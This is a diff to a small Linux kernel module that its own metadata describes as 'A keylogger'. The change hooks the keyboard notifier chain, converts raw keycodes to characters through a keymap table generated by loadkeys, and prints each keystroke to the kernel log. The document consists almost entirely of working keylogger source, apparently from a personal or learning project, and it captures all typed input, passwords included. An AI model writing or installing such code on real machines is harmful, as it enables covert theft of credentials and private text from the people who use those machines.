@@ -2,19 +2,26 @@
 #include <linux/module.h>
 #include <linux/notifier.h>
 #include <linux/keyboard.h>
+#include "kloggg-keymap.h" /* produced by output of "loadkeys --mktable" */
 
 MODULE_AUTHOR("Nicholas Hubbard");
 MODULE_DESCRIPTION("A keylogger");
 MODULE_LICENSE("GPL");
 
+static u_short kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
+  return plain_map[keycode];
+}
+
 static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
   struct keyboard_notifier_param *param = data;
 
-  if (action == KBD_UNICODE && param->down) {
-    unsigned int unicode_val = param->value;
-    printk(KERN_INFO "Unicode value: 0x%x (Character: %lc)\n", unicode_val, unicode_val);
+  if (action == KBD_KEYCODE && param->down) {
+    unsigned int keycode = param->value;
+    int shift_mask = param->shift;
+    u_short symbol = kloggg_keycode_to_symbol(keycode, shift_mask);
+    printk(KERN_INFO "kloggg: %lc", symbol);
   }
-  
+
   return NOTIFY_OK;
 }
 
